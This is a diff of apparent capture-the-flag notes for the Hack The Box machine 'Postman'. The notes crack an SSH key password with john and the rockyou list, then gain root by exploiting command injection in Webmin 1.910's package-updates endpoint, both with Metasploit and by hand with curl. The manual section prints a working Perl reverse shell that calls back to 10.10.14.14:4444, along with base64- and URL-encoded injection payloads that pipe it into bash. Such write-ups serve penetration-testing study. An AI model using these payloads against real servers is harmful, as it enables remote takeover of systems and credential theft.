@@ -155,20 +155,21 @@ python3 /usr/share/john/ssh2john.py /share/postman.ssh > /share/postman.ssh.john
 curl -sS -L -o /share/ssh2john.py https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
 python3 /share/ssh2john.py /share/postman.ssh > /share/postman.ssh.john
 
-# PWD: computer2008
+# password: computer2008
 tar xvzf /wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /share
 john /share/postman.ssh.john --wordlist=/share/rockyou.txt
 # user access
 su - Matt
+
+# flag
+cat /home/Matt/user.txt
 ```
 
-### Privilege Escalation TODO
+### Privilege Escalation
 
-Metasploit
+#### Exploit with Metasploit
+
 ```bash
-docker exec -it htb-metasploit bash
-openvpn /share/*.ovpn
-
 # search exploits
 # Webmin version: 1.910
 searchsploit webmin -j
@@ -192,38 +193,34 @@ set USERNAME Matt
 set PASSWORD computer2008
 set SSL true
 exploit
+
+# flag
+cat /toot/root.txt
 ```
 
-Intercept requests with Burp
+#### Exploit manually
 
-* public port `4444:4444` metasploit + openvpn
-* public port `8080:8081` burpsuite + openvpn
-
+Intercept Metasploit requests with Burp
 ```bash
-make do-htb-tunnel
-
-# start burp suite
-vncviewer localhost:5900
-openvpn /share/*.ovpn
-install_firefox_foxy_proxy
-burpsuite
 # save <BURP_SUITE_IP_ADDRESS> eth0
 ifconfig
 
 # config metasploit
 vi /etc/hosts
-#<BURP_SUITE_IP_ADDRESS> burpsuite
+# <BURP_SUITE_IP_ADDRESS> burpsuite
 ping burpsuite
 
-# setup proxy on port 8081
-set Proxies http:burpsuite:8081
+show advanced options
+# setup proxy on port 8090
+set Proxies http:burpsuite:8090
 set ReverseAllowProxy true
 exploit
-# >>> expect intercept
+
+# >>> intercept with Burp Suite
 ```
 
-Inspect request
-```
+Inspect Metasploit requests
+```bash
 # headers
 POST /package-updates/update.cgi HTTP/1.1
 Host: 10.10.10.160:10000
@@ -242,28 +239,9 @@ echo "cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzIC
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.14:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 
-Setup Burp
+Build payload
 ```bash
-# download certificate
-http://localhost:8080
-
-# Preferences > Privacy & Security > Certificates > View Certificates > Import
-# select "cacert.der" and "Trust this CA"
-
-# add proxy in FoxyProxy
-# burp | 127.0.0.1 | 8080
-
-# verify intercept
-# Matt (username) | computer2008 (password)
-https://10.10.10.160:10000
-```
-
-Manual payload
-
-* public port `4242:4242` lab + openvpn
-
-```bash
-# ISSUE with httpie, prefer curl
+# issues with httpie, prefer curl
 # https://github.com/httpie/httpie/issues/534
 # -n: do not print trailing newline
 # --form adds also the charset by default which is causing the request to fail and needs to be explicitly removed
@@ -290,6 +268,9 @@ curl -i -k -X POST \
   https://10.10.10.160:10000/package-updates/update.cgi
 
 # https://unix.stackexchange.com/questions/159253/decoding-url-encoding-percent-encoding
+alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
+alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'
+
 urldecode 'u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages'
 # output
 u=acl/apt&u= | bash -c "{echo,<ENCODED_PAYLOAD>}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
@@ -298,10 +279,9 @@ u=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_
 
 # test locally: verify bash expansion without spaces - it can't contain pipes
 bash -c "{ping,-c,1,127.0.0.1}"
-# verify intercept packets
+# verify intercept packets locally
 tcpdump -i lo -n icmp
 
-docker exec -it htb-lab bash
 # e.g. tun0 10.10.14.15
 ifconfig
 # verify intercept packets
